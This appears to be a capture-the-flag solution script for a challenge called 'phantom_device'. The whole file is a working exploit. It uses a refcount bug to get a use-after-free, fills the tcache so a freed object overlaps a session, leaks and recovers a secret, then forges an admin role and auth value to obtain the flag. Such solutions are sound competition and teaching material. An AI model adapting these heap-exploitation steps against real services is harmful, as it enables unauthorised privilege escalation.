#!/usr/bin/env python3
"""Exploit for the BDSEC challenge `phantom_device`.

Usage:
    python3 solve_phantom_device.py local ./phantom_device
    python3 solve_phantom_device.py local ./phantom_device --cwd /path/with/flag
    python3 solve_phantom_device.py remote HOST PORT
"""

from __future__ import annotations

import argparse
import os
import select
import socket
import struct
import subprocess
import sys
import time
from pathlib import Path
from typing import Optional

MASK64 = (1 << 64) - 1
SESSION_MAGIC = 0x504853455353494F
ADMIN_ROLE = 0x1337133713371337
AUTH_XOR = 0xA55AA55AA55AA55A
VALIDATION_BIAS = 0x5478547854785478
TCACHE_FILL_COUNT = 7


def rol64(value: int, bits: int) -> int:
    return ((value << bits) | (value >> (64 - bits))) & MASK64


def ror64(value: int, bits: int) -> int:
    return ((value >> bits) | (value << (64 - bits))) & MASK64


class Tube:
    def __init__(self, fd: int, writer, closer=None, timeout: float = 5.0):
        self.fd = fd
        self.writer = writer
        self.closer = closer
        self.timeout = timeout
        self.buffer = bytearray()

    def close(self) -> None:
        if self.closer is not None:
            try:
                self.closer()
            except Exception:
                pass

    def _fill(self, deadline: float) -> None:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            raise TimeoutError(f"timeout; buffered={bytes(self.buffer)!r}")

        readable, _, _ = select.select([self.fd], [], [], remaining)
        if not readable:
            raise TimeoutError(f"timeout; buffered={bytes(self.buffer)!r}")

        data = os.read(self.fd, 4096)
        if not data:
            raise EOFError(f"connection closed; buffered={bytes(self.buffer)!r}")
        self.buffer.extend(data)

    def recvuntil(self, token: bytes | str, timeout: Optional[float] = None) -> bytes:
        if isinstance(token, str):
            token = token.encode()
        deadline = time.monotonic() + (self.timeout if timeout is None else timeout)
        while token not in self.buffer:
            self._fill(deadline)
        end = self.buffer.index(token) + len(token)
        result = bytes(self.buffer[:end])
        del self.buffer[:end]
        return result

    def recvn(self, size: int, timeout: Optional[float] = None) -> bytes:
        deadline = time.monotonic() + (self.timeout if timeout is None else timeout)
        while len(self.buffer) < size:
            self._fill(deadline)
        result = bytes(self.buffer[:size])
        del self.buffer[:size]
        return result

    def send(self, data: bytes | str) -> None:
        if isinstance(data, str):
            data = data.encode()
        self.writer(data)

    def sendline(self, data: bytes | str = b"") -> None:
        if isinstance(data, str):
            data = data.encode()
        self.send(data + b"\n")


class ProcessTube(Tube):
    def __init__(self, binary: str, cwd: Optional[str], timeout: float):
        process = subprocess.Popen(
            [binary],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            cwd=cwd,
            bufsize=0,
        )
        assert process.stdin is not None and process.stdout is not None

        def writer(data: bytes) -> None:
            process.stdin.write(data)
            process.stdin.flush()

        super().__init__(
            process.stdout.fileno(),
            writer,
            closer=lambda: process.kill() if process.poll() is None else None,
            timeout=timeout,
        )
        self.process = process


class SocketTube(Tube):
    def __init__(self, host: str, port: int, timeout: float):
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.setblocking(True)
        super().__init__(sock.fileno(), sock.sendall, closer=sock.close, timeout=timeout)
        self.sock = sock


def sendline_after(io: Tube, prompt: bytes | str, value: int | bytes | str) -> None:
    io.recvuntil(prompt)
    io.sendline(str(value) if isinstance(value, int) else value)


def choose(io: Tube, option: int) -> None:
    sendline_after(io, b"> ", option)


def allocate_device(io: Tube) -> int:
    choose(io, 1)
    line = io.recvuntil(b"\n")
    try:
        return int(line.split(b"Handle: ", 1)[1])
    except (IndexError, ValueError) as exc:
        raise RuntimeError(f"unexpected allocate response: {line!r}") from exc


def duplicate_handle(io: Tube, handle: int) -> int:
    choose(io, 2)
    sendline_after(io, b"Handle: ", handle)
    line = io.recvuntil(b"\n")
    try:
        return int(line.split(b"handle ", 1)[1].split(b".", 1)[0])
    except (IndexError, ValueError) as exc:
        raise RuntimeError(f"unexpected duplicate response: {line!r}") from exc


def release_handle(io: Tube, handle: int) -> None:
    choose(io, 5)
    sendline_after(io, b"Handle: ", handle)
    io.recvuntil(b"Released.\n")


def create_session(io: Tube, name: bytes = b"guest") -> int:
    choose(io, 6)
    io.recvuntil(b"Name: ")
    io.sendline(name)
    line = io.recvuntil(b"\n")
    try:
        return int(line.split(b"Session: ", 1)[1])
    except (IndexError, ValueError) as exc:
        raise RuntimeError(f"unexpected session response: {line!r}") from exc


def read_device(io: Tube, handle: int, offset: int, size: int) -> bytes:
    choose(io, 3)
    sendline_after(io, b"Handle: ", handle)
    sendline_after(io, b"Offset: ", offset)
    sendline_after(io, b"Size: ", size)
    data = io.recvn(size)
    io.recvuntil(b"\n")  # putc('\n') after the raw output
    return data


def write_device(io: Tube, handle: int, offset: int, data: bytes) -> None:
    choose(io, 4)
    sendline_after(io, b"Handle: ", handle)
    sendline_after(io, b"Offset: ", offset)
    sendline_after(io, b"Size: ", len(data))
    io.recvuntil(b"Data: ")
    io.send(data)  # exact byte count; do not append a newline
    io.recvuntil(b"Written.\n")


def request_flag(io: Tube, session: int) -> bytes:
    choose(io, 8)
    sendline_after(io, b"Session: ", session)
    output = io.recvuntil(b"\n1. Allocate device", timeout=10.0)
    return output.rsplit(b"\n1. Allocate device", 1)[0].strip()


def exploit(io: Tube) -> bytes:
    # calloc does not consume this tcache bin on the tested glibc path. Fill the
    # 0x110 bin first so the target free is returned to an arena bin/top chunk
    # and can be reclaimed by the session's calloc.
    filler_handles = [allocate_device(io) for _ in range(TCACHE_FILL_COUNT)]
    for handle in filler_handles:
        release_handle(io, handle)

    target_handle = allocate_device(io)
    dangling_handle = duplicate_handle(io, target_handle)

    # Duplicate failed to increment device->refcount. Releasing one handle frees
    # the object while the duplicate remains marked active.
    release_handle(io, target_handle)

    # Same-size allocation reuses the freed 0x100-byte object.
    session = create_session(io)

    leaked = read_device(io, dangling_handle, 0, 0x30)
    magic, uid, old_role, nonce, auth1, old_auth2 = struct.unpack("<6Q", leaked)
    if magic != SESSION_MAGIC:
        raise RuntimeError(
            "session did not overlap the dangling device handle "
            f"(magic=0x{magic:016x}); remote allocator settings may differ"
        )

    # auth1 = rol64(uid ^ secret, 17) ^ nonce ^ AUTH_XOR
    secret = uid ^ ror64(auth1 ^ nonce ^ AUTH_XOR, 17)

    # The privileged validation uses a different auth2 formula than session
    # creation, so forge the value expected by option 8.
    forged_auth2 = (
        rol64(nonce, 11)
        ^ secret
        ^ rol64((uid + VALIDATION_BIAS) & MASK64, 29)
    )

    print(f"[+] target handle    : {target_handle}")
    print(f"[+] dangling handle  : {dangling_handle}")
    print(f"[+] overlapped session: {session}")
    print(f"[+] uid              : {uid}")
    print(f"[+] original role    : 0x{old_role:016x}")
    print(f"[+] nonce            : 0x{nonce:016x}")
    print(f"[+] recovered secret : 0x{secret:016x}")
    print(f"[+] original auth2   : 0x{old_auth2:016x}")
    print(f"[+] forged auth2     : 0x{forged_auth2:016x}")

    write_device(io, dangling_handle, 0x10, struct.pack("<Q", ADMIN_ROLE))
    write_device(io, dangling_handle, 0x28, struct.pack("<Q", forged_auth2))

    return request_flag(io, session)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Solve phantom_device locally or remotely")
    parser.add_argument("--timeout", type=float, default=5.0)
    subparsers = parser.add_subparsers(dest="mode", required=True)

    local = subparsers.add_parser("local", help="run a local binary")
    local.add_argument("binary")
    local.add_argument("--cwd", help="working directory containing flag.txt")

    remote = subparsers.add_parser("remote", help="connect to a challenge service")
    remote.add_argument("host")
    remote.add_argument("port", type=int)
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    io: Optional[Tube] = None
    try:
        if args.mode == "local":
            binary = str(Path(args.binary).resolve())
            io = ProcessTube(binary, args.cwd, args.timeout)
        else:
            io = SocketTube(args.host, args.port, args.timeout)

        result = exploit(io)
        print(f"[+] privileged response: {result.decode(errors='replace')}")
        return 0
    except (EOFError, TimeoutError, OSError, RuntimeError, AssertionError) as exc:
        print(f"[-] exploit failed: {exc}", file=sys.stderr)
        return 1
    finally:
        if io is not None:
            io.close()


if __name__ == "__main__":
    raise SystemExit(main())
